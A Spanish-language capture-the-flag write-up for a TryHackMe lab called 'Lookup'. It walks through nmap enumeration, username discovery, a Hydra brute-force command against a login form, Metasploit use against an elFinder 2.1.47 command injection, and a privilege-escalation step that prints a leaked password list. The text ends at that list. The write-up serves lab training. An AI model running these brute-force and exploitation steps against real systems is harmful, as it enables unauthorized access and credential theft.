# Conectividad

![image](https://github.com/user-attachments/assets/9c87be3b-8916-4137-a03a-6f2edaa733c0)

# Enumeración

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.171.41
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-23 15:36 GMT
Nmap scan report for 10.10.171.41
Host is up (0.000096s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
MAC Address: 02:E3:ED:A7:A5:D5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
```

Al conectarnoos al http por puerto 80 nos encontramos que no busca por el dominio esta registrado a "lookup.thm" simplemente lo añadimos a nuestro DNS

```
echo "ip lookup.thm" | sudo tee -a /etc/hosts
```

Después de ir enumerando un rato, encontramos que hay una forma muy simple de saber si un usuario existe o no, hemos metido un sniper simplemente e ir probando nombres hasta que de un legnth diferente, encontramos:

- admin
- jose

Con esta información podemos hacer un ataque con hydra de fuerza bruta al usuario jose

```
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```

Sacamos la pass 

jose:password123

Al entrar parece ser que no metemos dentro de un subdominio, lo deberemos añadir

![image](https://github.com/user-attachments/assets/f665ba70-2623-4faf-b6d8-7c3aa298a162)

Una vez dentro vamos a enumerar esto que tiene buena pinta

# Explotación

En los archivos enumerados no encontramos información relevante vamos a inspeccionar si dicho software tiene alguna vulnerabilidad

![image](https://github.com/user-attachments/assets/b200dfec-b5c9-4af4-8ee6-c364211dc02d)

elfinder 2.1.47

![image](https://github.com/user-attachments/assets/effd91f5-235c-4553-9c3a-20488777da2f)

Parece que hay una vulnerabilidad de command injection

ya sabemos 

```
msfconsole
```

buscamos el modulo auxiliar

```
show options
```

configuramos las opciones y estamos dentro

![image](https://github.com/user-attachments/assets/9383bcc4-7b3b-46de-942e-9651189f4cbe)

Vamos a hacer una shell y sacar a ver la primera flag y posteriormente buscar la escala de privilegios

# Escala de privilegios

Con el usuario de www-data no tenemos privilegios para ver el user.txt vamos a probar otros vectores

![image](https://github.com/user-attachments/assets/a32dc666-d95c-4bd5-ad5b-6fa076a7a615)

Después de enumerar los servicios nos encontramos con el /usr/sbin/pwm

![image](https://github.com/user-attachments/assets/57788841-64f6-4878-8df0-4b62465e443b)

Parece ser que nos da el .password un archivo del home de think

![image](https://github.com/user-attachments/assets/d6cfdb64-1b8d-414d-b9d5-498114ff492a)



```

jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```
